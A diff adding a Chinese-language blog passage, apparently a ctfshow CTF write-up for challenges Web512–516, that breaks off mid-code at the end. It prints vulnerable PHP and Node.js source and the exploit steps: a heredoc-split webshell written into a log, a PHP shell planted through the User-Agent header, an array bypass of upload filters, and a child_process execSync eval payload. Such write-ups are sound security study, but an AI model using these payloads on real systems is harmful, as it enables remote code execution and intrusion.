+				
+			&amp;#125;
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+
+&amp;#125;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里对 value 的值加了一些限制，那么这里考虑绕过就行，其他的流程还是一样的&lt;/p&gt;
+&lt;p&gt;加模块&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720124936070.png&#34; alt=&#34;image-20230720124936070&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里贴一下群主的骚操作&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;1;
+$a=&amp;lt;&amp;lt;&amp;lt;ctfshow
+&amp;lt;?php includ
+ctfshow;
+$b=&amp;lt;&amp;lt;&amp;lt;ctfshow
+e $
+ctfshow;
+$v1=&amp;lt;&amp;lt;&amp;lt;ctfshow
+_POS
+ctfshow;
+$c=&amp;lt;&amp;lt;&amp;lt;ctfshow
+T&amp;#123;1&amp;#125;?&amp;gt;
+ctfshow;
+$d=&amp;lt;&amp;lt;&amp;lt;ctfshow
+1.php
+ctfshow;
+$e=clone $db;
+$e-&amp;gt;log-&amp;gt;log=$d;
+$e-&amp;gt;log-&amp;gt;content=$a.$b.$v1.$c;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720154402842.png&#34; alt=&#34;image-20230720154402842&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;然后去调用一下 checkVar 方法&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720154435369.png&#34; alt=&#34;image-20230720154435369&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720154446378.png&#34; alt=&#34;image-20230720154446378&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web513&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web513&#34;&gt;#&lt;/a&gt; Web513&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);
+		$cache=templateUtil::shade($templateContent,$arg);
+		echo $cache;
+	&amp;#125;
+	public static  function shade($templateContent,$arg=array())&amp;#123;
+		$templateContent=templateUtil::checkImage($templateContent,$arg);
+		$templateContent=templateUtil::checkConfig($templateContent);
+		$templateContent=templateUtil::checkVar($templateContent,$arg);
+		$templateContent=templateUtil::checkFoot($templateContent);
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkImage($templateContent,$arg=array())&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			if(preg_match(&#39;/gopher|file/i&#39;, $value))&amp;#123;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, &#39;&#39;, $templateContent);
+			&amp;#125;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				$encode=&#39;&#39;;
+				if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&amp;#123;
+					$encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));
+				&amp;#125;else&amp;#123;
+					$ch=curl_init($value);
+					curl_setopt($ch, CURLOPT_HEADER, 0);
+					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+					$result=curl_exec($ch);
+					curl_close($ch);
+					$ret=chunk_split(base64_encode($result));
+					$encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;
+					file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);
+				&amp;#125;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $encode, $templateContent);
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+	public static function checkConfig($templateContent)&amp;#123;
+		$config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
+		foreach ($config as $key =&amp;gt; $value) &amp;#123;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;config:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;config:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkVar($templateContent,$arg)&amp;#123;
+		$db=new db();
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;var:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				if(!preg_match(&#39;/\(|\[|\`|\&#39;|\$|\_|\&amp;lt;|\?|\&amp;quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i&#39;, $value))&amp;#123;
+					eval(&#39;$v=&#39;.$value.&#39;;&#39;);
+					$templateContent=str_replace(&#39;&amp;#123;&amp;#123;var:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $v, $templateContent);
+				&amp;#125;
+				
+			&amp;#125;
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkFoot($templateContent)&amp;#123;
+		if ( stripos($templateContent, &#39;&amp;#123;&amp;#123;cnzz&amp;#125;&amp;#125;&#39;)) &amp;#123;
+			$config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
+			$foot = $config[&#39;cnzz&#39;];
+			if(is_file($foot))&amp;#123;
+				$foot=file_get_contents($foot);
+				include($foot);
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个文件中新加入了一个 checkFoot，原来的 checker 黑名单中加入了新的东西，不是很好利用，将目光转向 checkFoot&lt;/p&gt;
+&lt;p&gt;这里先去读取 setting 文件的内容，取 cnzz 指向的值，将这个值所代表的文件包含，先看 setting 中 snzz 指向什么&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720165938829.png&#34; alt=&#34;image-20230720165938829&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到，指向的是页面统计，这个值相当于下面这句话&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720170122069.png&#34; alt=&#34;image-20230720170122069&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;想要进 if 这个必须是一个文件，文件内容会作为下图的值被 include 包含&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720170308801.png&#34; alt=&#34;image-20230720170308801&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720170530937.png&#34; alt=&#34;image-20230720170530937&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这个文件用于满足 if (stripos ($templateContent, &#39;&#39;))&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720170641880.png&#34; alt=&#34;image-20230720170641880&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这个文件用于被 file_get_contents ($foot); 读取拿到内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720170846381.png&#34; alt=&#34;image-20230720170846381&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里用于 $foot = $config [&#39;cnzz&#39;]; 的赋值，最后使用 view 渲染&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720171029620.png&#34; alt=&#34;image-20230720171029620&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里就成功了，ua 头写个马进去&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720171405163.png&#34; alt=&#34;image-20230720171405163&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;读取 flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720171345339.png&#34; alt=&#34;image-20230720171345339&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web514&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web514&#34;&gt;#&lt;/a&gt; Web514&lt;/h2&gt;
+&lt;p&gt;render/render_class.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);
+		$cache=templateUtil::shade($templateContent,$arg);
+		echo $cache;
+	&amp;#125;
+	public static  function shade($templateContent,$arg=array())&amp;#123;
+		$templateContent=templateUtil::checkImage($templateContent,$arg);
+		$templateContent=templateUtil::checkConfig($templateContent);
+		$templateContent=templateUtil::checkVar($templateContent,$arg);
+		$templateContent=templateUtil::checkFoot($templateContent);
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkImage($templateContent,$arg=array())&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			if(preg_match(&#39;/gopher|file/i&#39;, $value))&amp;#123;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, &#39;&#39;, $templateContent);
+			&amp;#125;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				$encode=&#39;&#39;;
+				if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&amp;#123;
+					$encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));
+				&amp;#125;else&amp;#123;
+					$ch=curl_init($value);
+					curl_setopt($ch, CURLOPT_HEADER, 0);
+					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+					$result=curl_exec($ch);
+					curl_close($ch);
+					$ret=chunk_split(base64_encode($result));
+					$encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;
+					file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);
+				&amp;#125;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $encode, $templateContent);
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+	public static function checkConfig($templateContent)&amp;#123;
+		$config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
+		foreach ($config as $key =&amp;gt; $value) &amp;#123;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;config:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;config:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkVar($templateContent,$arg)&amp;#123;
+		$db=new db();
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;var:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				if(!preg_match(&#39;/\(|\[|\`|\&#39;|\$|\_|\&amp;lt;|\?|\&amp;quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i&#39;, $value))&amp;#123;
+					eval(&#39;$v=&#39;.$value.&#39;;&#39;);
+					$templateContent=str_replace(&#39;&amp;#123;&amp;#123;var:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $v, $templateContent);
+				&amp;#125;
+				
+			&amp;#125;
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkFoot($templateContent)&amp;#123;
+		if ( stripos($templateContent, &#39;&amp;#123;&amp;#123;cnzz&amp;#125;&amp;#125;&#39;)) &amp;#123;
+			$config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
+			$foot = $config[&#39;cnzz&#39;];
+			if(is_file($foot))&amp;#123;
+				$foot=file_get_contents($foot);
+				if(!preg_match(&#39;/&amp;lt;|&amp;gt;|\?|=|php|sess|log|phar|\.|\[|\&amp;#123;|\(|_/&#39;, $foot))&amp;#123;
+					include($foot);
+				&amp;#125;
+				
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里读取上一个利用点的文件 ，这里加了很多限制&lt;/p&gt;
+&lt;p&gt;api/admin_templates.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+session_start();
+include(&#39;../render/db_class.php&#39;);
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+$action=$_GET[&#39;action&#39;];
+if(!isset($user))&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+switch ($action) &amp;#123;
+	case &#39;list&#39;:
+		$sql = &amp;quot;select id,name,type,path,des from templates limit 0,10&amp;quot;;
+		$db=new db();
+		$temps = $db-&amp;gt;select_array($sql);
+		if(count($temps)&amp;gt;0)&amp;#123;
+			$ret[&#39;count&#39;]=count($temps);
+			$ret[&#39;data&#39;]=$temps;
+			$ret[&#39;msg&#39;]=&#39;查询成功&#39;;
+		&amp;#125;
+		break;
+	case &#39;update&#39;:
+		extract($_POST);
+		$row=json_decode($row);
+		if(waf($row))&amp;#123;
+			break;
+		&amp;#125;
+		$sql =&amp;quot;update templates set name=&#39;&amp;#123;$row-&amp;gt;name&amp;#125;&#39;,path=&#39;&amp;#123;$row-&amp;gt;path&amp;#125;&#39;,type=&#39;&amp;#123;$row-&amp;gt;type&amp;#125;&#39;,des=&#39;&amp;#123;$row-&amp;gt;des&amp;#125;&#39; where id =&amp;#123;$row-&amp;gt;id&amp;#125;&amp;quot;;
+		$db = new db();
+		if($db-&amp;gt;update_one($sql))&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;实时更新成功&#39;;
+		&amp;#125;else&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;实时更新失败&#39;;
+		&amp;#125;
+		break;
+	case &#39;getContents&#39;:
+		extract($_POST);
+		$template=json_decode($template);
+		if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\\u4e00-\u9fa5]+$/&#39;, $template-&amp;gt;path))&amp;#123;
+			$ret[&#39;count&#39;]=1;
+			$ret[&#39;msg&#39;]=&#39;查询成功&#39;;
+			$ret[&#39;data&#39;]=array(&#39;contents&#39;=&amp;gt;htmlspecialchars(file_get_contents(__DIR__.&#39;/../templates/&#39;.$template-&amp;gt;path)));
+		&amp;#125;
+		break;
+	case &#39;download&#39;:
+		extract($_POST);
+		if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\u4e00-\u9fa5]+$/&#39;, $path))&amp;#123;
+			header(&amp;quot;Content-Type: application/octet-stream&amp;quot;); 
+			header(&#39;Content-Disposition:  attachment; filename=&amp;quot;&#39; . $path. &#39;&amp;quot;&#39;);
+			echo file_get_contents(__DIR__.&#39;/../templates/&#39;.$path);
+			exit();
+		&amp;#125;
+		break;
+	case &#39;upload&#39;:
+		extract($_POST);
+		if(!preg_match(&#39;/php|phar|ini|settings/i&#39;, $name))
+		&amp;#123;	
+			if(preg_match(&#39;/&amp;lt;|&amp;gt;|\?|php|=|script|,|;|\(/i&#39;, $content))&amp;#123;
+				$ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
+			&amp;#125;else&amp;#123;
+				file_put_contents(__DIR__.&#39;/../templates/&#39;.$name, $content);
+				$ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;
+			&amp;#125;
+			
+		&amp;#125;else&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
+		&amp;#125;
+		break;
+	default:
+		# code...
+		break;
+&amp;#125;
+
+function waf($row)&amp;#123;
+	$ret = false;
+	if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&amp;gt;name))&amp;#123;
+		$ret=true;
+	&amp;#125;
+	if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&amp;gt;type))&amp;#123;
+		$ret=true;
+	&amp;#125;
+	if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&amp;gt;des))&amp;#123;
+		$ret=true;
+	&amp;#125;
+	if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&amp;gt;path))&amp;#123;
+		$ret=true;
+	&amp;#125;
+	if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&amp;gt;id))&amp;#123;
+		$ret=true;
+	&amp;#125;
+	return $ret;
+&amp;#125;
+die(json_encode($ret));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720174447621.png&#34; alt=&#34;image-20230720174447621&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;将目光放到这里，这里有一个文件上传功能，只要突破两个 if 就能成功上传文件，这里的 content 可以使用数组绕过，来写一个文件进去，通过上一题的利用思路包含这个文件来获得一个 shell&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720180904966.png&#34; alt=&#34;image-20230720180904966&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720180225262.png&#34; alt=&#34;image-20230720180225262&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720181020544.png&#34; alt=&#34;image-20230720181020544&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;渲染&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720181132027.png&#34; alt=&#34;image-20230720181132027&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web515&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web515&#34;&gt;#&lt;/a&gt; Web515&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720181220798.png&#34; alt=&#34;image-20230720181220798&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;突然就 js 了，这里还给了一个文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+var express = require(&#39;express&#39;);
+var _= require(&#39;lodash&#39;);
+var router = express.Router();
+
+/* GET users listing. */
+router.get(&#39;/&#39;, function(req, res, next) &amp;#123;
+  res.render(&#39;index&#39;, &amp;#123; title: &#39;鎴戞槸澶嶈鏈�&#39; &amp;#125;);
+&amp;#125;);
+
+router.post(&#39;/&#39;,function(req,res,next)&amp;#123;
+	if(req.body.user!=null)&amp;#123;
+		msg = req.body.user;
+		if((msg.match(/proto|process|require|exec|var|&#39;|&amp;quot;|:|\[|\]|[0-9]/))!==null || msg.length&amp;gt;40)&amp;#123;
+		  	res.render(&#39;index&#39;, &amp;#123; title: &#39;鏁忔劅淇℃伅涓嶅璇�&#39; &amp;#125;);
+		&amp;#125;else&amp;#123;
+			res.render(&#39;index&#39;, &amp;#123; title: eval(msg) &amp;#125;);
+		&amp;#125;
+	&amp;#125;else&amp;#123;
+		res.render(&#39;index&#39;, &amp;#123; title: &#39;鎴戞槸澶嶈鏈�&#39; &amp;#125;);
+	&amp;#125;
+	 
+&amp;#125;);
+module.exports = router;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;过滤了一些字符&lt;/p&gt;
+&lt;p&gt;页面也很明显，post 给 index.php {&amp;quot;user&amp;quot;:&amp;quot;我是复读机&amp;quot;}, 这里 user 对应的值就是上面代码中的 msg&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720184558676.png&#34; alt=&#34;image-20230720184558676&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里嵌套一下就行&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;a=require( &#39;child_process&#39; ).execSync( &#39;cat /flag&#39; ).toString()
+POST
+&amp;#123;&amp;quot;user&amp;quot;:&amp;quot;eval(req.query.a)&amp;quot;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720184752203.png&#34; alt=&#34;image-20230720184752203&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web516&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web516&#34;&gt;#&lt;/a&gt; Web516&lt;/h2&gt;
+&lt;p&gt;这个题直接给源码是个 nodejs&lt;/p&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; router &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;koa-router&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; User &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;../models/User.js&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; md5 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;md5-node&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;router&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;ctx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;render&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;index&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token literal-property property&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ctfshow&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;router&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/signin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;async&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;ctx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token 